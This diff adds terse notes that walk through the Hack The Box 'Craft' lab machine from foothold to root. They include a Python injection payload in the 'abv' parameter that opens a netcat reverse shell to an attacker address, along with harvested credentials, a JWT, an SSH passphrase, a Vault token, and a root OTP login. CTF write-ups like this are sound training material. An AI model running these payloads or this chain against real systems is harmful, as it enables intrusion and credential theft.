@@ -1,0 +1,61 @@
+foothold
+--------
+1) get dinesh credential from previous git commit
+https://gogs.craft.htb/Craft/craft-api/commit/10e3ba4f0a09c778d7cec673f28d410b73455a86
+-----------------------------------------------
+gogAcc::dinesh:4aUh0A8PbVJxgd
+
+https://api.craft.htb/api/auth/login using dinesh credential
+------------------------------------------------------------
+{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTc2NjY2NjE5fQ.SOhcMzp5RXikQr-xl8dS8zZSc-hSixzRSlJ0oHiRSzw"}
+
+json parameter next page
+------------------------
+https://api.craft.htb/api/brew/?page=234
+
+2) edit the test.py from the repository and execute locally to get reverse shell
+/*
+//abuse the 'abv' that check for values
+payload_py="""__import__("os").system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.169 18890 >/tmp/f") """
+payload=payload_py
+brew_dict = {}
+brew_dict['abv'] = payload
+*/
+
+3)nc listener responsed, now you're in the jail(busybox shell)
+
+user
+----
+1)gotten sql credential from /opt/app/craft_api/settings.py
+2)now get dbtest.py and execute sql command
+//SHOW TABLES  #to show tables in db
+//SELECT * FROM user  #get user credentials 
+2.5)chmod 400 id_rsa #only let owner have access to read the id_rsa(ssh script might reject id_rsa if let others have permission)
+3)Get ssh id_rsa from gilfoyle gogs repo account
+4)ssh-add id_rsa and add the passphrase 'ZEU3N8WNM2rh4T'
+5)then ssh gilfoyle@craft.htb with passphrase 'ZEU3N8WNM2rh4T'
+6)grab userFlag!!
+
+
+root
+----
+/*
+found vault.craft.htb subdomain
+found vault_token: f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+*/
+
+1)vault login #use the vault_token
+2)vault list /ssh/roles 
+/*
+Keys
+----
+root_otp
+*/
+so ssh root password use otp 
+3)vault ssh root@localhost
+/*
+OTP for the session is: 8deb2ff1-6fdf-c287-bc9c-eb1ebbafff63
+//use the OTP to login for root ssh credential
+*/
+4)grab the rootFlag!!
+
